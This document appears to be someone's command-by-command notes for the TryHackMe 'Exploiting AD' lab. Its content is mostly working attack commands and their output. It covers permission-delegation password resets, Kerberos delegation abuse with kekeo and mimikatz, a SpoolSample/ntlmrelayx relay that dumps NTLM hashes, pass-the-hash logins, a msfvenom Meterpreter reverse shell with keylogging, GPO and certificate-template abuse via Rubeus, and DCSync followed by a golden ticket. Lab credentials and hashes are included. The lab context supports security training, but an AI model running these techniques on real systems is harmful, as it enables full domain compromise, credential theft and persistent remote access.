# https://tryhackme.com/room/exploitingad

```bash
=================================
TARGET_IP_ADDRESS -- domain.com -- win/lin x32/x64
=================================
vpn-connect
chsh -s $(which zsh)
echo 'export TARGET=TARGET_IP_ADDRESS' >> ~/.zshrc && source ~/.zshrc
echo "$TARGET TARGET" | sudo tee -a /etc/hosts

# Enable dnsmasq plugin & DNS config
sudo cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.bak
sudo sed -i '/\[main\]/a dns=dnsmasq' /etc/NetworkManager/NetworkManager.conf
echo "server=/za.tryhackme.loc/10.200.72.101" | sudo tee /etc/NetworkManager/dnsmasq.d/exploitad.conf

# Configures to use dnsmasq
sudo nmcli connection modify "exploitad" ipv4.dns ""
sudo nmcli connection modify "exploitad" ipv4.ignore-auto-dns yes
sudo nmcli connection modify "exploitad" ipv4.never-default yes

# Verify settings (might need to disconnect/reconnect VPN)
ping -c 1 google.com
ping -c1 10.200.72.101
nslookup THMDC.za.tryhackme.loc
# https://tryhackme.com/access

# Sometimes multiple refreshes are needed
vpn-connect
sudo systemctl restart NetworkManager

---

https://distributor.za.tryhackme.loc/creds
# Your credentials have been generated:
# Username: paula.bailey
# Password: Y2VgRWWiQ 

sshpass -p 'Y2VgRWWiQ' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 paula.bailey@10.200.72.248
sudo apt install -y autossh
autossh -M 0 -o "ServerAliveInterval 15" -o "ServerAliveCountMax 3" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 paula.bailey@10.200.72.248

---

bloodhound-cli check
bloodhound-cli up
bloodhound-cli resetpwd
# localhost:8080

---

# Exploiting Permission Delegation
powershell
# Add my user to the group
Add-ADGroupMember "IT Support" -Members "paula.bailey"
# Verify
Get-ADGroupMember -Identity "IT Support"

# Force Change Password... pick victim user
Get-ADGroupMember -Identity "Tier 2 Admins"
distinguishedName : CN=t2_ross.bird,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_ross.bird
objectClass       : user
objectGUID        : d7cb6223-38f0-4553-9ef3-d10727bdcc02
SamAccountName    : t2_ross.bird
SID               : S-1-5-21-3885271727-2693558621-2658995185-5316
# Set new password for user
$Password = ConvertTo-SecureString "TacomanStrikesAgain123!!!" -AsPlainText -Force
Set-ADAccountPassword -Identity "t2_ross.bird" -Reset -NewPassword $Password
gpupdate /force

sshpass -p 'TacomanStrikesAgain123!!!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 t2_ross.bird@10.200.72.248

type C:\Users\Administrator\Desktop\flag1.txt

---

# Exploiting Kerberos Delegation
powershell
Import-Module C:\Tools\PowerView.ps1
Get-NetUser -TrustedToAuth

C:\Tools\mimikatz_trunk\x64\mimikatz.exe
token::elevate
lsadump::secrets
// Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc
// cur/text: Password1@

### HTTP Ticket
C:\Tools\kekeo\x64\kekeo.exe
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
// Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'
# Pick a T1 admin
Get-ADGroupMember -Identity "Tier 1 Admins"
// t1_melanie.wilson
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_melanie.wilson /service:http/THMSERVER1.za.tryhackme.loc
// Ticket in file 'TGS_t1_melanie.wilson@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

C:\Tools\mimikatz_trunk\x64\mimikatz.exe
privilege::debug
kerberos::ptt TGS_t1_melanie.wilson@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

### WSMAN Ticket
C:\Tools\kekeo\x64\kekeo.exe
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_melanie.wilson /service:wsman/THMSERVER1.za.tryhackme.loc
// Ticket in file 'TGS_t1_melanie.wilson@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

C:\Tools\mimikatz_trunk\x64\mimikatz.exe
privilege::debug
kerberos::ptt TGS_t1_melanie.wilson@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

# Check that tickets are injected
klist
Cached Tickets: (2)
#0>     Client: t1_melanie.wilson @ ZA.TRYHACKME.LOC
        Server: wsman/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 12/11/2025 1:13:48 (local)
        End Time:   12/11/2025 10:59:48 (local)
        Renew Time: 12/18/2025 0:59:48 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

#1>     Client: t1_melanie.wilson @ ZA.TRYHACKME.LOC
        Server: http/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 12/11/2025 1:04:08 (local)
        End Time:   12/11/2025 10:59:48 (local)
        Renew Time: 12/18/2025 0:59:48 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

New-PSSession -ComputerName thmserver1.za.tryhackme.loc
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc

type C:\users\administrator\desktop\flag2.txt

---

# Exploiting Automated Relays

# Shows that THM2 box is admin over THM1 box
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p

# Get that print spooler
GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
Location      :
Name          : Microsoft XPS Document Writer
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2

Location      :
Name          : Microsoft Print to PDF
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2

Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc

# NOTE: sometimes these will be blocked from querying the ports or info, but the exploit still works

# SMB signing should not be ENFORCED or REQUIRED
sudo nmap -n -Pn --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

# Capture auth from print spooler
impacket-ntlmrelayx -smb2support -t smb://"10.200.72.201" -debug
# https://github.com/leechristensen/SpoolSample
C:\tools\SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.150.72.3"

[+] NewStyle hashes is: True
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
[+] NewStyle hashes is: True
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
[+] NewStyle hashes is: True
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::

evil-winrm -i THMSERVER1.za.tryhackme.loc -u ServerAdmin -H 3279a0c6dfe15dc3fb6e9c26dd9b066c

type C:\users\administrator.za\desktop\flag3.txt

---

# Exploiting AD Users

wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.224/Snaffler.exe
upload wget Snaffler.exe
cd C:\users\public\
.\Snaffler.exe -s -o snaffle -i C:\

xfreerdp3 /v:THMSERVER1.za.tryhackme.loc /u:ServerAdmin /pth:3279a0c6dfe15dc3fb6e9c26dd9b066c /cert:ignore +clipboard /dynamic-resolution /drive:/usr/share/windows-resources/mimikatz/x64,share
// no RDP allowed
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
// NOW RDP works

### Listener for reverse callbacks
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
setg lhost 0.0.0.0
set lport 443
run

# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.150.72.3 LPORT=50007 -f psh > gpupdate.ps1
# | iconv -t UTF-16LE | base64 -w 0 > meterpreter.ps1
# execute in powershell
# powershell.exe -ExecutionPolicy Bypass -EncodedCommand '<BASE64_STRING>'
# powershell.exe -ExecutionPolicy Bypass -File gpupdate.ps1

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.150.72.3 LPORT=443 -f exe > gpupdate.exe
cd C:\users\public\
upload gpupdate.exe
.\gpupdate.exe
// success!

search -d C:\\ -f PasswordDatabase.kdbx
C:\Users\Administrator.ZA\Documents\PasswordDatabase.kdbx  1886          2022-04-27 15:45:29 -0500
C:\Users\t1_trevor.jones\Documents\PasswordDatabase.kdbx   1886          2022-04-27 15:45:29 -0500
C:\Users\trevor.local\Documents\PasswordDatabase.kdbx      2190          2022-04-30 10:36:02 -0500

# Similute user to grab keystrokes from
execute -f cmd.exe -c -i -d "C:\Windows\System32" -a "/c net user trevor.local 'TacoManStrikesAgain123!!!'"
execute -f powershell.exe -c -i -d "C:" -a "-ExecutionPolicy Bypass -File C:\\auto-login.ps1 trevor.local 'TacoManStrikesAgain123!!!' THMSERVER1"
shutdown -r

# Now look for explorer
getsystem
ps | grep explorer
 PID   PPID  Name          Arch  Session  User                     Path
 ---   ----  ----          ----  -------  ----                     ----
 3632  3572  explorer.exe  x64   1        THMSERVER1\trevor.local  C:\Windows\explorer.exe
migrate 3632
getuid

download C:\\users\\trevor.local\\PasswordDatabase.kdbx
keyscan_start
 keyscan_dump
// keep<CR>
// <Shift>Imreallysurenoonewillguessmypassword

sudo apt install -y keepassxc

# High priv account
// svcServMan
// Sup3rStr0ngPass!@

---

# Exploiting GPOs

xfreerdp3 /v:THMWRK1.za.tryhackme.loc /u:paula.bailey /p:Y2VgRWWiQ /cert:ignore +clipboard /dynamic-resolution /drive:/usr/share/windows-resources/mimikatz/x64,share

runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe
// Sup3rStr0ngPass!@

# CHECK GPO PERMS
$GPO = Get-ADObject -Filter "displayName -eq 'Management Server Pushes'"
Get-ACL -Path "AD:$($GPO.DistinguishedName)" | Format-List Access

$GPO = Get-ADObject -Filter "displayName -eq 'Management Server Pushes'" -Properties nTSecurityDescriptor
$GPO.nTSecurityDescriptor | Select-Object -ExpandProperty Access | Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType -AutoSize

Get-ADPrincipalGroupMembership -Identity "svcServMan" | Select-Object Name

# Verify privs
dir \\za.tryhackme.loc\sysvol

mmc

    Click File -> Add/Remove Snap-in
    Select the Group Policy Management snap-in and click Add
    Click Ok

    Expand Computer Configuration
    Expand Policies
    Expand Windows Settings
    Expand Security Settings
    Right Click on Restricted Groups and select Add Group (If the IT Support group already exists, it means someone has already performed the exploit. You can either delete it to create it yourself, or just inspect it to see what was configured.)
    Click Browse, enter IT Support and  click Check Names
    Click Okay twice
The first filter is not used. For the second filter, we want to add both the Administrators and Remote Desktop Users groups.

xfreerdp3 /v:THMSERVER2.za.tryhackme.loc /u:paula.bailey /p:Y2VgRWWiQ /cert:ignore +clipboard /dynamic-resolution /drive:/usr/share/windows-resources/mimikatz/x64,share

C:\Users\Administrator\Desktop\flag4.txt

---

# Exploiting Certificates

# Show certificate templates for enrollment
certutil -Template -v
# Client Authentication - The certificate can be used for Client Authentication.
# CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - The certificate template allows us to specify the Subject Alternative Name (SAN).
# CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - The certificate will be exportable with the private key.
# Certificate Permissions - We have the required permissions to use the certificate template.

// Template[32]
 Template[32]:
  TemplatePropCommonName = Web Server Cert Template
  TemplatePropFriendlyName = Web Server Cert Template
  TemplatePropEKUs =
2 ObjectIds:
    1.3.6.1.5.5.7.3.2 Client Authentication
    1.3.6.1.5.5.7.3.1 Server Authentication

  TemplatePropCryptoProviders =
    0: Microsoft RSA SChannel Cryptographic Provider
    1: Microsoft DH SChannel Cryptographic Provider

  TemplatePropMajorRevision = 64 (100)
  TemplatePropDescription = Computer
  TemplatePropSchemaVersion = 2
  TemplatePropMinorRevision = 8
  TemplatePropRASignatureCount = 0
  TemplatePropMinimumKeySize = 800 (2048)
  TemplatePropOID =
    1.3.6.1.4.1.311.21.8.1823699.10350885.1394572.4929479.14975766.202.6863080.14328679 Web Server Cert Template

  TemplatePropV1ApplicationPolicy =
2 ObjectIds:
    1.3.6.1.5.5.7.3.2 Client Authentication
    1.3.6.1.5.5.7.3.1 Server Authentication

  TemplatePropEnrollmentFlags = 1
    CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1

  TemplatePropSubjectNameFlags = 1
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1

  TemplatePropPrivateKeyFlags = 1010010 (16842768)
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
    TEMPLATE_SERVER_VER_2003<<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536)
    TEMPLATE_CLIENT_VER_XP<<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216)

  TemplatePropGeneralFlags = 20241 (131649)
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1
    CT_FLAG_MACHINE_TYPE -- 40 (64)
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
    CT_FLAG_IS_MODIFIED -- 20000 (131072)

  TemplatePropSecurityDescriptor = O:S-1-5-21-3330634377-1326264276-632209373-500G:S-1-5-21-3330634377-1326264276-632209373-519D:PAI(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-3885271727-2693558621-2658995185-6150)(OA;;CR;a05b8cc2-17bc-4802-a710-e7c15ab866a2;;S-1-5-21-3885271727-2693558621-2658995185-6150)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-3330634377-1326264276-632209373-512)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;LCRPRC;;;S-1-5-21-3885271727-2693558621-2658995185-6150)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-3330634377-1326264276-632209373-512)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-3330634377-1326264276-632209373-500)(A;;LCRPLORC;;;AU)

    Allow Enroll	ZA\THMSERVER2$
    Allow Auto-Enroll	ZA\THMSERVER2$
    Allow Enroll	TRYHACKME\Domain Admins
    Allow Enroll	TRYHACKME\Enterprise Admins
    Allow Read	ZA\THMSERVER2$
    Allow Full Control	TRYHACKME\Domain Admins
    Allow Full Control	TRYHACKME\Enterprise Admins
    Allow Full Control	TRYHACKME\Administrator
    Allow Read	NT AUTHORITY\Authenticated Users


  TemplatePropExtensions =
4 Extensions:

  Extension[0]:
    1.3.6.1.4.1.311.21.7: Flags = 0, Length = 2f
    Certificate Template Information
        Template=Web Server Cert Template(1.3.6.1.4.1.311.21.8.1823699.10350885.1394572.4929479.14975766.202.6863080.14328679)
        Major Version Number=100
        Minor Version Number=8

  Extension[1]:
    2.5.29.37: Flags = 0, Length = 16
    Enhanced Key Usage
        Client Authentication (1.3.6.1.5.5.7.3.2)
        Server Authentication (1.3.6.1.5.5.7.3.1)

  Extension[2]:
    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature, Key Encipherment (a0)

  Extension[3]:
    1.3.6.1.4.1.311.21.10: Flags = 0, Length = 1a
    Application Policies
        [1]Application Certificate Policy:
             Policy Identifier=Client Authentication
        [2]Application Certificate Policy:
             Policy Identifier=Server Authentication

  TemplatePropValidityPeriod = 2 Years
  TemplatePropRenewalPeriod = 6 Weeks
// Template[32]

    Click Start->run
    Type mmc and hit enter
    Click File->Add/Remove Snap-in..
    Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts.
    Click OK
    
We will request a personal certificate:

    Right Click on Personal and select All Tasks->Request New Certificate...
    Click Next twice to select the AD enrollment policy.
    You will see that we have one template that we can request, but first, we need to provide additional information.
    Click on the More Information warning.
    Change the Subject name Type option to Common Name and provide any value, since it does not matter, and click Add.
    Change the Alternative name Type option to User principal name.
    Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add.
    
The last step is to export our certificate with the private key:

    Right-click on the certificate and select All Tasks->Export...
    Click Next, select Yes, export the private key, and click Next.
    Click Next, then set a password for the certificate since the private key cannot be exported without a password.
    Click Next and select a location to store the certificate.
    Click Next and finally click Finish.

# Request TGT to create Cert
cd C:\tools
.\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:"C:\users\paula.bailey\Desktop\tacoman.pfx" /password:"tacoman" /outfile:"tacoman.tgt" /domain:za.tryhackme.loc /dc:10.200.72.101

# use TGT to auth to DC
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
privilege::debug
kerberos::ptt tacoman.tgt
exit
type \\THMDC.za.tryhackme.loc\c$\users\administrator\desktop\flag5.txt

---

# Exploiting Domain Trusts

# Get KRBTGT NTLM hash to forge TRTs
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
privilege::debug
lsadump::dcsync /user:za\krbtgt
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 4/25/2022 6:18:22 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 16f9af38fca3ada405386b3b57366082

The key here is that we will exploit the trust the parent domain has with our child domain by adding the SID of the Enterprise Admins (EA) group as an extra SID to our forged ticket for the domain controller of the child domain. The EA group belongs to the parent domain and membership to this group essentially grants Administrative privileges over the entire forest! The default SID for this group is S-1-5-21-<RootDomain>-519. 

# Get SIDs of child DC and Enterprise Admins
Get-ADComputer -Identity "THMDC"
// SID               : S-1-5-21-3885271727-2693558621-2658995185-1001

Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
// SID               : S-1-5-21-3330634377-1326264276-632209373-519

# Generate Golden Ticket
# /sid: DC
# /sids: Enterprise Admin
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt

# Verify
dir \\thmdc.za.tryhackme.loc\c$
dir \\thmrootdc.tryhackme.loc\c$

type \\thmrootdc.tryhackme.loc\c$\users\administrator\desktop\flag6.txt
```